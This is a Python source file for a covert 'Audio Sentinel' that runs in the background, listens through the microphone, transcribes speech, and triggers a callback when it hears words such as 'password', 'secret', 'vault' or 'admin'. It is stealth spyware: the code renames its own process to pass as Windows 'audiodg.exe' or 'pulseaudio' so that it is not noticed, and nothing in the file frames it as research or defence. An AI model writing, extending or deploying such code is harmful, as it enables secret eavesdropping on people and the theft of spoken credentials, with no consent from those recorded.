"""
LOPUTHJOSEPH - AUDIO SENTINEL
- Edge Transcription for keyword triggering
- Low-resource background listening
- Disguised as system audio processes
"""

import speech_recognition as sr
import logging
import threading
import time
import os
from typing import List, Callable, Optional

logger = logging.getLogger("AUDIO_SENTINEL")

class AudioSentinel:
    def __init__(self, keywords: Optional[List[str]] = None):
        self.keywords = keywords or ["password", "secret", "vault", "money", "admin", "open", "stolen", "thief"]
        self.active = False
        self.recognizer = sr.Recognizer()
        self.trigger_callback: Optional[Callable[[str, str], None]] = None
        self._mask_process()

    def _mask_process(self):
        """Attempts to rename the process for stealth (OS dependent)"""
        try:
            import setproctitle
            # Disguise as Windows Audio Graph Isolation or PulseAudio
            if os.name == 'nt':
                setproctitle.setproctitle("audiodg.exe")
            else:
                setproctitle.setproctitle("pulseaudio --start")
        except ImportError:
            pass

    def set_trigger_callback(self, callback: Callable[[str, str], None]):
        """Sets the function to call when a keyword is detected"""
        self.trigger_callback = callback

    def start_listening(self):
        """Starts the background listening thread"""
        if self.active:
            return
        self.active = True
        threading.Thread(target=self._listen_loop, daemon=True).start()
        logger.info("[*] Audio Sentinel: 'Audio Ear' is active and listening...")

    def _listen_loop(self):
        """Background loop for keyword detection"""
        while self.active:
            try:
                with sr.Microphone() as source:
                    # Adjust for ambient noise (essential for low-gain/whisper detection)
                    self.recognizer.adjust_for_ambient_noise(source, duration=1)
                    
                    # Listen for a short phrase
                    audio = self.recognizer.listen(source, phrase_time_limit=7)
                    
                    try:
                        # Convert speech to text locally (Edge Transcription)
                        # Note: recognize_google is used here, but for offline-first 
                        # in Uganda, a pocketsphinx or whisper-tiny fallback is preferred.
                        text = self.recognizer.recognize_google(audio).lower()
                        
                        # Check for keywords
                        for word in self.keywords:
                            if word in text:
                                logger.warning(f"[!] Trigger word detected: {word}")
                                if self.trigger_callback:
                                    self.trigger_callback(word, text)
                                break # One trigger per phrase
                    except sr.UnknownValueError:
                        # Normal background noise or silence
                        pass
                    except sr.RequestError as e:
                        logger.error(f"[-] Speech service error: {e}")
                        time.sleep(5)
            except Exception as e:
                logger.error(f"[-] Audio Sentinel error: {e}")
                time.sleep(10)

    def stop_listening(self):
        self.active = False

audio_sentinel = AudioSentinel()
